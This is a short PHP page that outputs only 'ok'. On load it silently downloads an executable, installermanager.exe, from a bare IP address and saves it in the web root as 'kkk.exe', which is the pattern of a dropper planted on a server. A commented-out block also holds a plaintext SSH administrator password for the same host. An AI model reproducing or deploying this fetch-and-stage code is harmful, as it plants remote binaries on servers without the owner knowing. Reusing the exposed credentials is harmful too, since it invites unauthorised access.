<?

//include 'config.php';
/*
$connection = ssh2_connect('8.29.154.20', 22);
ssh2_auth_password($connection, 'administrator', 'zo0u917ZVb');

ssh2_scp_recv($connection, '/installermanager.exe', 'new_installer.exe');
 */
function download_file ($url, $path) {

    $newfilename = $path;
    $file = fopen ($url, "rb");
    if ($file) 
    {
        $newfile = fopen ($newfilename, "wb");

        if ($newfile)
            while(!feof($file)) 
            {
                fwrite($newfile, fread($file, 1024 * 8 ), 1024 * 8 );
            }
    }

    if ($file) {
        fclose($file);
    }
    if ($newfile) {
        fclose($newfile);
    }
}

$full = "http://8.29.154.20/installermanager.exe";
$newfile = $_SERVER['DOCUMENT_ROOT'] . '/kkk.exe';

download_file($full, $newfile);
?>
<html>
  <head>
    
  </head>
  <body>
                    ok
  </body>
</html>